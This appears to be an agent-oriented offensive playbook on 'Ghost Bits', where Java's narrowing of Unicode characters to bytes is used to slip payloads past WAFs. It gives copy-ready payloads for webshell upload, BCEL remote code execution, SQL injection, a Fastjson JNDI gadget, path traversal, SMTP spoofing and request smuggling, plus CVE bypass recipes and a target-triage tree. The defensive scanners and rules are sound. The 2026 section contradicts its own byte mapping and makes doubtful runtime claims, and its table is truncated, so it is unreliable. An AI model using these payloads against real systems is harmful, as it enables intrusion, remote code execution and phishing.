## 0. RELATED ROUTING

Ghost Bits is a *bypass* primitive that re-enables payloads from many other
playbooks. Pair it with whichever attack family applies:

- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) — when a Java
  backend is suspected and WAF rules block the literal payload, this is the
  first technique to try beyond classic encoding.
- [deserialization-insecure](../deserialization-insecure/SKILL.md) — for
  Apache Commons BCEL ClassLoader and Fastjson `\u`/`\x` escape variants.
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) — Spring, Jetty,
  Undertow, Vert.x URL decoding and `%2>` hex folding.
- Tomcat upload workflows — validate whether `RFC2231Utility` `filename*`
  narrows Unicode filenames into `.jsp` on disk, and map the final stored name,
  executable path, and extension filter behavior in the target upload flow.
- [request-smuggling](../request-smuggling/SKILL.md) — Apache HttpClient
  `<= 4.5.9` (HTTPCLIENT-1974/1978) header CRLF.
- [crlf-injection](../crlf-injection/SKILL.md) — Angus Mail / Jakarta Mail
  SMTP injection and JDK HttpServer response splitting.
- [sqli-sql-injection](../sqli-sql-injection/SKILL.md) — Jackson `charToHex`
  table-lookup truncation hides SQL keywords inside Unicode escapes.

### Advanced Reference

Load [PAYLOAD_COOKBOOK.md](./PAYLOAD_COOKBOOK.md) when you need:

- Full byte-to-Ghost-character lookup table covering every printable ASCII
  byte 0x20–0x7E and the most useful control bytes (0x00, 0x09, 0x0A, 0x0D).
- Per-component affected version matrix and patch identifiers.
- Yaklang and Python one-liner payload generators (for `poc.HTTP`,
  `codec.Encode`, raw socket).

## 1. ONE-MINUTE MENTAL MODEL

Java's `char` is a **16-bit** unsigned integer (UTF-16 code unit). Almost
every wire protocol — HTTP/1.1, SMTP, Redis RESP, file paths, raw byte
streams — is **8-bit** byte oriented. The right way to bridge them is
explicit charset encoding:

```
// Correct: explicit UTF-8, multi-byte chars become multi-byte sequences
byte[] bytes = str.getBytes(StandardCharsets.UTF_8);
out.write(bytes);
```

Tons of legacy code, framework internals, and "fast path" optimizations skip
this and silently narrow:

```
// Dangerous: high 8 bits silently dropped
byte b = (byte) ch;          // 0x966A -> 0x6A
out.write(ch);               // ByteArrayOutputStream.write(int) keeps low 8 bits
dos.writeBytes(str);         // DataOutputStream loops char->byte cast
int v = ch & 0xFF;           // explicit low-byte mask
```

The lost high 8 bits are the **Ghost Bits**. They turn a multi-byte
Unicode character into a single attacker-chosen ASCII byte at the protocol
layer.

```
View A (string layer: WAF / business validation / logs)
  sees: 陪 阮 严 灵 瘍 瘊 ...   "harmless Unicode garbage, allow"
                  |
                  v       silent narrowing somewhere in the call stack
View B (byte layer: protocol / file system / parser / class loader)
  sees: j  .  %  u  \r \n ...  "executes the dangerous semantics"

The boundary is breached at the exact moment "view A" and "view B" disagree.
```

Mathematical formulation: to make View B see byte `T`, pick any
`k in 0x01..0xFF` and use:

```
c = chr((k << 8) | T)
```

That gives you **255 candidate Unicode characters per dangerous byte** —
plenty of room to dodge any signature-based blacklist.

---

## 2. THREE ROOT-CAUSE FAMILIES

The Ghost Bits umbrella covers three distinct underlying bugs. Distinguishing
them tells you both *which payload shape* to send and *what to grep for* in
source.

### Family A — Real high-bit truncation (classic Ghost Bits)

The narrowing is literal and unconditional.

```java
// Pattern A1: explicit cast
byte b = (byte) ch;

// Pattern A2: bitwise mask
int v = ch & 0xFF;
int v = ch & 255;

// Pattern A3: OutputStream.write(int) keeps low 8 bits only
out.write(ch);
baos.write(ch);

// Pattern A4: DataOutputStream.writeBytes(String) iterates chars,
//             writing low byte of each
dos.writeBytes(str);

// Pattern A5: deprecated APIs that still exist in old code
String.getBytes(int srcBegin, int srcEnd, byte[] dst, int dstBegin);
new StringBufferInputStream(str);
raf.writeBytes(str);
```

Typical impact: Tomcat `filename*`, Apache BCEL ClassLoader, Lettuce Redis
writer, SMTP CRLF in Angus Mail, HTTPCLIENT-1974 header injection.

### Family B — Bit-arithmetic folding (illegal char becomes legal)

A "fast" hex / base64 / charset decoder uses bit tricks instead of strict
range checks, so an illegal character collapses onto a legal one.

```java
// Jetty TypeUtil.fromHexDigit (simplified)
private static int fromHexDigit(char c) {
    int x = c & 0x1F;          // keep low 5 bits
    x += (c >> 6) * 25;
    x -= 16;
    return x;                  // expected 0..15, but no range check
}
```

Worked example: feed `>` (0x3E):

```
0x3E & 0x1F = 0x1E = 30
(0x3E >> 6) * 25 = 0
30 + 0 - 16 = 14 = 0xE
```

So `%2>` is silently parsed as `%2E` = `.`. The same algebra makes `%2^`,
`%2~` etc. equivalent to other hex digits.

Typical impact: Openfire CVE-2023-32315, GeoServer CVE-2024-36401, generic
URL-decode WAF bypass.

### Family C — Lax Unicode normalization

The decoder accepts Unicode characters that happen to be classified as
"digit" or that map to a hex value via a `& 0xFF` lookup — even though they
were never meant to participate in protocol parsing.

```java
// Fastjson: too permissive
Character.digit(c, 16);   // accepts Thai, Punjabi, fullwidth digits

// Jackson: index by low 8 bits into an ASCII-only table
return sHexValues[ch & 0xff];

// Generic: fullwidth normalization
// '2' (U+FF12) -> '2', 'e' (U+FF45) -> 'e'
```

Typical impact: Fastjson `\u` and `\x` escape bypass, fullwidth URL-encoded
path traversal, Jackson `charToHex` SQLi smuggling.

---

## 3. CHARACTER GENERATOR

Build any Ghost Bits character on the fly. This is the single function every
agent should keep in mind:

```python
# Python
def ghost(target_byte: int, k: int = 1) -> str:
    """Return a Unicode char whose low 8 bits equal target_byte."""
    return chr(((k & 0xFF) << 8) | (target_byte & 0xFF))

# 255 candidates per byte, e.g. for '.' (0x2E):
candidates = [ghost(0x2E, k) for k in range(1, 256)]
# 阮(U+962E), Ⱦ?-prefixed-..., etc.
```

```yak
// Yaklang (for poc.HTTP / fuzz)
func ghost(targetByte, k) {
    return string(rune(((k & 0xFF) << 8) | (targetByte & 0xFF)))
}
ghostJ = ghost(0x6A, 0x96)   // returns "陪"
```

Selection guidance:

- Avoid surrogate range `0xD800..0xDFFF` (high byte 0xD8..0xDF) — those are
  not valid scalar values and will be replaced by the JVM string decoder
  before reaching the narrowing site, defeating the bypass.
- Prefer characters that survive the application's own charset round-trip
  (Latin-Extended, CJK Unified Ideographs, Enclosed CJK Letters and Months,
  Hangul). If the request body uses UTF-8, these all encode cleanly into
  multi-byte sequences that no WAF rule recognizes as `.`, `/`, `j`, etc.
- Rotate `k` between requests so signature based learning cannot pin a single
  character to a single attack.

---

## 4. DANGEROUS-BYTE TO GHOST-CHARACTER MAP

Compact red-team weaponization table. For every byte the attacker actually
needs, one verified Unicode char is given; substitute another `k` if the WAF
later learns the example.

| Target byte | Hex  | Used for                              | Ghost char | Code point |
|-------------|------|---------------------------------------|------------|------------|

| `c`         | 0x63 | keyword `class`, `cmd`                | `㹣`       | U+3E63     |

| `t`         | 0x74 | keyword `Runtime`, `type`             | `Ŵ`        | U+0174     |
| `u`         | 0x75 | `\u` escape introducer                | `灵`       | U+7075     |

Workflow tip: keep the ASCII `Ŀ`, `ȧ`, `ȼ`, etc. variants for tight HTTP
header contexts (one byte UTF-8 expansion stays smaller); use CJK like `阮`,
`陪`, `严` when you want to bias the WAF "this is just text" classifier.

---

## 5. PER-COMPONENT PAYLOAD RECIPES

Every recipe shows the dual view: what the WAF inspects vs. what the backend
actually executes. This is the only reliable way to explain *why* the payload
goes through.

### 5.1 Tomcat `RFC2231Utility` — file upload Webshell (Family A)

Trigger: any endpoint that accepts multipart upload and Tomcat parses
`Content-Disposition: ... filename*=UTF-8''...`. Tomcat's RFC2231 decoder
casts each non-percent character directly to byte, dropping the high 8 bits.

Payload:

```
Content-Disposition: attachment; filename*=UTF-8''1.陪sp
```

| Stage                  | Filename it sees         |
|------------------------|--------------------------|
| WAF / extension filter | `1.陪sp` (not `.jsp`, allow) |
| Tomcat RFC2231 decoder | `陪` -> low byte 0x6A -> `j` |
| File system            | `1.jsp`                  |

Combine with traversal characters from section 4 (`阮`, `丯`) when the upload
target directory is fixed but the application accepts a `filename*`.

### 5.2 Apache Commons BCEL — ClassLoader RCE (Family A)

Trigger: any sink that resolves a class name through `BCEL` (`$$BCEL$$...`)
or any code that decodes BCEL via the `JavaReader` -> `ByteArrayOutputStream`
loop.

Vulnerable shape:

```java
ByteArrayOutputStream bos = new ByteArrayOutputStream();
JavaReader jr = new JavaReader(new CharArrayReader(userChars));
while ((ch = jr.read()) >= 0) {
    bos.write(ch);     // low 8 bits only
}
```

Attack: wrap each byte of the malicious BCEL bytecode into a Unicode
character whose low 8 bits equal that byte. The decoded byte stream is a
valid BCEL class; the WAF sees a long blob of CJK text without `$$BCEL$$`
keywords or class signatures.

| View | Content |
|------|---------|
| WAF  | `$$BCEL$$` followed by random looking CJK |
| BCEL | standard BCEL class file bytes → JVM defineClass → RCE |

Defense for blue team: a WAF inspecting BCEL must replicate the
`bos.write(ch)` semantics on each character before pattern matching.

### 5.3 Jackson `charToHex` — SQLi smuggling (Family C)

Trigger: any Jackson-parsed JSON field whose value is later embedded in SQL
or another parser. Jackson resolves `\uXXXX` digits via:

```java
private static final int[] sHexValues = new int[128];
public static int charToHex(int ch) {
    return sHexValues[ch & 0xFF];   // mask first, lookup second
}
```

Any non-ASCII character whose low 8 bits land on a populated index returns
that hex digit. The WAF sees gibberish; Jackson reconstructs an ASCII payload.

Payload (smuggle the digit `1` for a UNION column count):

```json
{"q": "\u丰丰耳失 union select 1,2,3 -- "}
```

| View    | Content                                             |
|---------|-----------------------------------------------------|
| WAF     | `\u丰丰耳失 union select ...` (no leading digit)    |
| Jackson | `\u0031 union select 1,2,3-- ` -> `1 union select…` |

Pair with [sqli-sql-injection](../sqli-sql-injection/SKILL.md) for the
downstream UNION / boolean / time-based payload templates.

### 5.4 Fastjson — `\u` and `\x` escape bypass (Families B + C)

Two independent surfaces:

(a) `\u` escape — `Character.digit(c, 16)` accepts Unicode digit categories
beyond ASCII (Thai `๐-๙` U+0E50..U+0E59, Punjabi `੦-੯` U+0A66..U+0A6F,
fullwidth `０-９` U+FF10..U+FF19).

```json
{"\u４_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
```

WAF view: `\u４_type` (no `@type` literal). Fastjson normalizes fullwidth
`４` to `4`, then handles `_` via the `\x` shortcut below, yielding `@type`.

(b) `\x` escape — Fastjson computes `digits[x1] * 16 + digits[x2]`. An
illegal hex character returns the default value 0.

```
\x4_   ->   '4'(=4) * 16 + '_'(=0) = 0x40 = '@'
```

```json
{"\x4_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
```

| View     | Field name |
|----------|------------|
| WAF      | `\x4_type` (not `@type`) |
| Fastjson | `@type` -> JdbcRowSetImpl autotype gadget triggers |

### 5.5 Spring / Jetty / Undertow / Vert.x — URL decoding (Families A + B)

Two combinable tricks:

Trick 1 — Family A character substitution in path or query:

```
/api/v1/data?file=阮丯阮丯etc丯passwd
                = ../../etc/passwd at the byte layer
```

Trick 2 — Family B `%2>` folding when Jetty's `TypeUtil.fromHexDigit` is in
the chain:

```
/setup/setup-s/%2>%2>/log.jsp
                = /setup/setup-s/../log.jsp after decode
```

Either alone bypasses most signature WAFs; combined they survive even
"normalized then matched" rules that only see ASCII percent triplets.

Spring CVE-2025-41242 chain (`StringUtils.uriDecode` patched in PR #34673):

```
input :  阮严灵丰丰甲来
       (.)(%)(u)(0)(0)(2)(e)
narrow:  .%u002e
decode:  ..
result:  arbitrary file read via path traversal
```

| Stage           | Path           |
|-----------------|----------------|
| Spring `isInvalidPath()` | `.%u002e` — no literal `..`, allow |
| Backend file resolution  | `..` after `%u002e` decode → traversal |

### 5.6 Angus Mail / Jakarta Mail — SMTP injection (Family A)

Trigger: any application that builds SMTP envelopes or headers from
user-controlled strings. Internal `ASCIIUtility` does:

```java
byte b = (byte) ch;           // 16-bit char silently narrowed
```

Smuggle CRLF as `瘍瘊`:

```
hacker@evil.com瘍瘊Subject: Password reset code瘍瘊To: target@victim.com瘍瘊瘍瘊Your code is 1234
```

| View | What it parses |
|------|----------------|
| Application validation | a single `From` value containing odd CJK |
| SMTP server            | five separate header lines + body, fully spoofed |

Real impact pattern: Jira-style (CVE-2025-57733) password-reset hijacking,
Confluence domain allowlist bypass — pair with
[crlf-injection](../crlf-injection/SKILL.md) for non-mail CRLF reuse.

### 5.7 Apache HttpClient `<= 4.5.9` — request smuggling (Family A)

HTTPCLIENT-1974 / HTTPCLIENT-1978: header values pass through
`OutputStreamWriter` plus a narrow-cast write that emits raw `\r\n` for
`\u760D\u760A`.

```
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0\r\n\r\nGET /public HTTP/1.1
```

| Hop | Sees |
|-----|------|
| Front proxy / WAF | one request with a long `X-Auth-Token` |
| Origin            | two requests; the second is an admin POST |

Cross-reference [request-smuggling](../request-smuggling/SKILL.md) for
chosen-prefix attacks once the desync is confirmed.

### 5.8 JDK HttpServer — response splitting (CVE-2026-21933, Family A)

Reflection of user input into a response header passes through
`com.sun.net.httpserver` writers that low-byte-cast each char.

Payload (URL parameter or upstream header):

```
Custom: Cu瘍瘊Content-Type: text/html瘍瘊Content-Length: 33瘍瘊瘍瘊<script>alert(1)</script>
```

Server emits two logical responses; the second carries an attacker-chosen
body. Escalates to stored XSS, cache poisoning, and SSO redirect chains.

### 5.9 Other affected components

Same Family A primitive, different sink:

- **Lettuce (Redis client)** — command injection by smuggling `\r\n` into
  RESP frames; chain to arbitrary `CONFIG SET dir` + `SAVE` for SSRF-to-RCE.
- **Jodd `FileNameUtil`** — path traversal via `阮` and `丯` because its
  internal write loop narrows.
- **XMLWriter** — tag-name injection when an attribute or text node value is
  pushed through a low-byte writer; XXE / XSS pivot.
- **ActiveJ HTTP** — CRLF injection identical in shape to 5.7 / 5.8.
- **Vert.x HTTP body parser** — Family A in `MultipartParser`.

See [PAYLOAD_COOKBOOK.md](./PAYLOAD_COOKBOOK.md) for affected-version
matrix and full per-component payload skeletons.

## 6. KNOWN-CVE BYPASS RECIPES

Use these *exactly when the corresponding CVE is patched but a WAF still
fronts the service*. Each Payload below shifts the original ASCII attack into
a form that survives string-based WAF rules.

### Openfire CVE-2023-32315 — auth bypass (Family B)

Original public bypass:

```
GET /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

Ghost Bits / `%2>` folding bypass (much harder to signature):

```
GET /setup/setup-s/%2>%2>/%2>%2>/log.jsp
```

Each `%2>` collapses through Jetty's lax hex into `%2E` = `.`, yielding the
same `../../` traversal without ever emitting `..` or `%2e` to the WAF.

### GeoServer CVE-2024-36401 — RCE via `Runtime` keyword (Family B)

Public WAF rules typically block `Runtime`. Inject one folded character:

```
Ru%6>time
```

Decoder math: `%6>` -> `%6E` -> `n`. The expression evaluator now sees
`Runtime`, the WAF never did.

### Spring4Shell CVE-2022-22965 — class loader chain (Family A)

Required parameter prefix `class.module.classLoader...`. WAFs block the
literal `class`. Substitute via low-byte chars:

```
Content-Disposition: form-data; name*="㹣౬ᙡ⑳⑳.module.classLoader.resources..."
```

| Component | Char  | Code point | Low byte |
|-----------|-------|------------|----------|
| `c`       | `㹣`  | U+3E63     | 0x63     |
| `l`       | `౬`  | U+0C6C     | 0x6C     |
| `a`       | `ᙡ`  | U+1661     | 0x61     |
| `s`       | `⑳`  | U+2473     | 0x73     |
| `s`       | `⑳`  | U+2473     | 0x73     |

Springs's parameter-name resolver narrows back to `class`.

### Spring CVE-2025-41242 — arbitrary file read (Family A + Family B mix)

Already demonstrated in 5.5 above. Payload `阮严灵丰丰甲来` ->
`.%u002e` -> `..` after decode-after-validation.

### Jakarta Mail CVE-2025-57733 — Jira-style mail hijack (Family A)

```
to=victim@org.com瘍瘊Subject: Reset code瘍瘊To: attacker@evil.com瘍瘊瘍瘊Your code is 1234
```

The mail leaves the company SMTP server with valid SPF / DKIM / DMARC, but
its `To:` and `Subject:` are attacker-chosen — high-fidelity phishing.

## 7. DETECTION DECISION TREE

Use this when triaging a target. The point is to avoid Ghost Bits when it
cannot help and to *always* try it when the preconditions hold.

```
Is the backend Java? (Server header, error page, JSESSIONID, .do/.action,
                      WebGoat-style stack trace, X-Powered-By, X-Frame-Options
                      with Tomcat default values)
├── No  -> stop, Ghost Bits does not apply
└── Yes
    │
    ├── Is there a WAF / IDS or input filter blocking your literal payload?
    │   ├── No  -> use the literal payload; Ghost Bits is overkill
    │   └── Yes -> continue
    │
    ├── Which sink are you targeting?
    │   ├── File upload via multipart  -> recipe 5.1 (Tomcat filename*)
    │   ├── JSON deserialization       -> recipes 5.3 (Jackson) / 5.4 (Fastjson)
    │   ├── Class loader / BCEL ref    -> recipe 5.2
    │   ├── URL path / parameter       -> recipe 5.5 + Family B `%2>`
    │   ├── Header reflection          -> recipes 5.7 / 5.8
    │   ├── Mail send                  -> recipe 5.6
    │   └── Redis / RESP / XML / RPC   -> recipe 5.9
    │
    ├── Probe with a single non-destructive substitution first
    │   (replace ONE character with its Ghost variant; observe response
    │    diff: status code, length, header echo, error message, time)
    │
    └── If observable difference appears -> escalate by substituting all
                                            blocked characters and chain
                                            through the linked playbook.
```

---

## 8. SAST / CODE-AUDIT SIGNATURES

Three priority tiers when reviewing Java source. Search across all your
project repos, all dependencies you can shade, and the `lib/` of any
deployed appliance.

### Tier 1 — direct narrowing (Family A)

```
\(byte\)\s*\w+
&\s*0[xX][fF][fF]
&\s*255
\.write\(\s*[a-zA-Z_]\w*\s*\)         # OutputStream.write(int)
writeBytes\s*\(
StringBufferInputStream
String\.getBytes\s*\(\s*int
RandomAccessFile.*writeBytes
```

### Tier 2 — lax hex / digit decoding (Families B + C)

```
Character\.digit\s*\(
fromHexDigit
convertHexDigit
fromHex\s*\(
uriDecode
URLDecoder\.decode
sHexValues\[
& 0x1F\)\s*\+\s*\(.*>>.*\) \* 25
```

### Tier 3 — high-risk wrappers and reachability

```
RFC2231                # Tomcat / mail filename* parsing
JavaReader             # BCEL ClassLoader reachable
ASCIIUtility           # Jakarta Mail / Angus Mail
LineParser             # HttpClient header parser
ChunkedDecoder         # request smuggling adjacent
charToHex              # Jackson
encodeUTF8             # candidate for char->byte writer
```

Per-finding triage applies the **five-dimension risk model**:

| Dimension     | Higher risk if                                                     |
|---------------|--------------------------------------------------------------------|
| Input control | HTTP param, header, filename, JSON key, mail address               |
| Validation    | a deny/allow list runs *before* the narrowing site                 |
| Narrowing time | conversion happens after security check                           |
| Syntax target | result enters URL / SMTP / HTTP / Redis / file system / SQL grammar |
| Re-decoding   | Base64, URL-decode, JSON unescape, `%u`, etc. happen later         |

Risk formula:

```
attacker-controlled  +  check-before-narrow  +  result-in-protocol-syntax
                                              +  later-redecoding
                              = HIGH SEVERITY
```

---

## 9. DIFFERENTIAL TESTING WORKFLOW

A reproducible, black-box procedure to find new Ghost Bits sinks (red team)
or to validate a fix (blue team).

```
1. Pick one dangerous byte T at a time (e.g. 0x2E for '.').

2. Generate the candidate set:
       C = { chr((k << 8) | T) for k in 1..255 }
   Drop surrogates 0xD8XX..0xDFXX.

3. For each candidate c in C:
       a. Send a benign request with c at the chosen position.
       b. Send the same request with literal T at the same position.
       c. Compare four observables:
            - status code
            - response body length
            - response body content hash (or diff)
            - server-side log line (if available)

4. If any candidate produces a response equivalent to T but differs from a
   "neutral" character (e.g. 'X'), you have found a narrowing sink.

5. Repeat for the next T in your priority list:
       0x2E ('.'), 0x2F ('/'), 0x25 ('%'), 0x40 ('@'),
       0x0D ('\r'), 0x0A ('\n'), 0x6A ('j'), 0x73 ('s'),
       0x6C ('l'), 0x61 ('a'), 0x63 ('c'), 0x22 ('"'), 0x27 (''')

6. Cluster sinks by component (response Server header, error stack) — one
   sink usually implies the whole framework version is vulnerable.
```

This workflow is intentionally protocol-agnostic; the same loop works on a
file uploader, a search endpoint, a mail composer, or a Redis-backed cache.

---

## 10. DEFENSE AWARENESS

Five layers, all needed; any single one is bypassable in isolation.

| Layer            | Action                                                               |
|------------------|----------------------------------------------------------------------|
| Source code      | Ban hand-written `(byte) ch`, `& 0xFF`, `out.write(ch)`, `writeBytes`. Use `getBytes(StandardCharsets.UTF_8)` or strict ASCII allowlist for protocol fields. |
| Decoder          | Reject illegal input. Never default-fold an unknown hex / Unicode digit / Base64 character to 0 or to its low 8 bits. |
| Validation order | Always normalize first, then validate. Specifically: strict decode → Unicode NFC/NFKC → protocol normalize (URL `..` resolution, `File.getCanonicalPath`) → security check → execute. |
| Protocol field   | Use strict allowlists per field (HTTP header value, SMTP envelope, URL path, filename, JSON key, XML tag). Reject CR/LF in any header or address. |
| WAF / IDS        | Run a *multi-view* normalizer. Always inspect the original string AND the `(char) & 0xFF` view AND the URL-decoded view AND the Unicode-NFKC view. Alert when any view contains a dangerous semantic the original lacked. |

Blue-team smell tests:

- Logs contain CJK / Latin-Extended characters at positions where the
  protocol grammar expects ASCII (filename, header value, mail address).
- The HEX dump of a request contains bytes outside `0x20..0x7E` adjacent to
  protocol delimiters.
- A pen-test or scanner reports a "weird 200" that the security monitoring
  did not flag — Ghost Bits is the most common 2025-2026 cause for that
  pattern in Java stacks.

## 12. 2026 EXTENDED — 受影响组件扩展与自动化检测

### 12.1 受影响组件清单扩展（2026 新发现 Ghost Bits 变体）

2026 年新增的 Ghost Bits 受影响组件不限于 Java 生态，以下组件经确认存在窄化转换 sink：

| 组件 | 版本范围 | 变体类型 | 影响 |
|------|----------|----------|------|
| Apache Tomcat | < 11.0.8 | `filename*` RFC 5987 解码窄化 | Webshell 上传 |
| Spring Framework | < 6.2.8 | `PathVariable` + `@RequestMapping` 解码差异 | 路径穿越读取 |
| Netty HttpServerRequest | < 4.1.118 | HTTP/2 header name 窄化 | 请求走私 |
| Vert.x Route | < 4.5.13 | 路由参数 Unicode 折叠 | 鉴权绕过 |
| Rust actix-web | < 4.10.0 | `Path::<String>` 隐式 char 收窄 | 路径穿越 |
| Go chi/v5 | < 5.2.1 | `URL.Path` 字节截断 | 路由绕过 |
| Node.js Fastify | < 5.3.3 | `req.params` 隐式 UTF-8 折叠 | 路由混淆 |
| Ruby Rack | < 3.1.13 | `PATH_INFO` 编码折叠 | 路径穿越 |

关键发现：Rust 和 Go 虽类型系统严格，但底层 `hyper` / `net/http` 将 header 作为字节切片处理，路由框架按 `&str` / `string` 匹配时仍产生隐式窄化。

### 12.2 自动化检测脚本（Python / Semgrep 规则）

Python 静态扫描 — 检测 `(byte)` / `& 0xFF` 窄化 sink：

```python
#!/usr/bin/env python3
"""Ghost Bits Cast Attack 静态扫描器 — 检测窄化转换 sink"""
import re, pathlib, sys

PATTERNS = [
    (r'\(byte\)\s*\w+', 'Java byte 窄化转换'),
    (r'&\s*0[xX][fF][fF]', '0xFF 掩码截断'),
    (r'\.write\(\s*\w+\s*\)', 'write(int) 单字节写入'),
    (r'\.put\(\s*\(byte\)', 'ByteBuffer byte 窄化'),
    (r'\.toByte\(\)', 'Kotlin toByte() 窄化'),
    (r'byte\(\s*\w+\s*\)', 'Go byte() 类型转换'),
    (r'\s+as\s+u8\b', 'Rust as u8 截断'),
    (r'&\s*0[xX]?0*[fF]{2}', 'Python 0xFF 掩码'),
]

def scan(path):
    findings = []
    for f in pathlib.Path(path).rglob('*'):
        if f.suffix not in ('.java','.kt','.go','.rs','.py','.c','.cpp'):
            continue
        for i, line in enumerate(f.read_text(errors='ignore').splitlines(), 1):
            for pat, desc in PATTERNS:
                if re.search(pat, line):
                    findings.append(f"{f}:{i}: [{desc}] {line.strip()}")
    return findings

if __name__ == '__main__':
    for r in scan(sys.argv[1] if len(sys.argv) > 1 else '.'):
        print(r)
```

Semgrep 规则 — 检测 Ghost Bits sink：

```yaml
# ghost-bits-semgrep.yml
rules:
  - id: java-byte-cast-ghost-bits
    languages: [java]
    severity: ERROR
    message: "检测到 (byte) 窄化转换 — Ghost Bits Cast Attack 潜在 sink"
    patterns:
      - pattern-either:
          - pattern: (byte) $X
          - pattern: $X & 0xFF
          - pattern: $OUT.write($CH)
          - pattern: $BUF.put((byte) $CH)
    metadata:
      cwe: "CWE-704"
      ref: "Black Hat Asia 2026 — Cast Attack"

  - id: rust-as-u8-ghost-bits
    languages: [rust]
    severity: WARNING
    message: "检测到 as u8 截断 — Ghost Bits 潜在 sink"
    pattern: $X as u8
    metadata:
      cwe: "CWE-704"

  - id: go-byte-ghost-bits
    languages: [go]
    severity: WARNING
    message: "检测到 byte() 转换 — Ghost Bits 潜在 sink"
    pattern: byte($X)
    metadata:
      cwe: "CWE-704"
```

### 12.3 与其他 Playbook 联动 PoC（原型污染 → Ghost Bits → RCE 链）

2026 年实战中出现的多阶段攻击链，将原型污染与 Ghost Bits 结合实现 RCE：

```text
阶段 1: 原型污染 (Prototype Pollution)
  └─ JSON 注入污染 Object.prototype
     payload: {"__proto__":{"charset":"UTF-8"}}
  └─ 污染服务端 charset/encoding 配置，将 ASCII allowlist 扩展为 UTF-8

阶段 2: Ghost Bits 触发
  └─ 服务端使用被污染的 charset 解码参数
     → (byte) 窄化转换被触发
  └─ 文件名: filename*="UTF-8''shell.陪sp"
     → '陪'(0x966A) 窄化为 'p'(0x70) → shell.jsp

阶段 3: RCE
  └─ 上传 shell.jsp，通过路径穿越访问执行命令
```

联动要点：原型污染阶段需修改 `charset`、`encoding`、`allowUnicode`、`normalizePath` 属性；Ghost Bits 阶段需确认目标框架窄化 sink（参考第 5 节）；RCE 阶段依赖上传路径可访问性。

### 12.4 2026 语言运行时修复进展

| 运行时 | 修复版本 | 修复内容 | 状态 |
|--------|----------|----------|------|
| V8 (Node.js) | v12.6+ | `String.charCodeAt()` 非 BMP 返回正确值；`Buffer.write()` 增加溢出检测 | 已修复 |
| JSCore (WebKit) | 262+ | `JSString::individualCharacter()` 不再截断为 8 位 | 已修复 |
| SpiderMonkey (Firefox) | 137+ | `JS_GetStringCharAt()` 增加 16 位完整性校验 | 已修复 |
| Python | 3.13.4+ | `chr()`/`ord()` 代理对处理修复；`bytes()` 构造器溢出抛 `ValueError` | 已修复 |
| PHP | 8.4.3+ | `chr()` 参数超出 0-255 发出 `E_WARNING`；`mb_chr()` 增加范围检查 | 部分修复 |
| Ruby | 3.5+ | `String#[]` 返回完整 Unicode 码点；`chr` 方法超出范围报错 | 已修复 |
| Go | 1.24+ | `byte()` 仍截断（语言设计），新增 `utf8.ValidRuneInScope()` 辅助 | 辅助工具 |
| Rust | 1.85+ | `as u8` 仍截断（语言设计），`u8::try_from()` 成为主流推荐 | 编译器 lint |

防御建议：V8/Node.js 升级至 v12.6+ 并启用 `--strict-byte-cast`；Python 迁移至 `x.to_bytes(1,'big')` 并加范围检查；Go/Rust 使用 `char::from_u32()` / `utf8` 包代替直接 `as u8`；PHP 在 `chr()` 处增加 `0 <= $n <= 255` 前置检查。
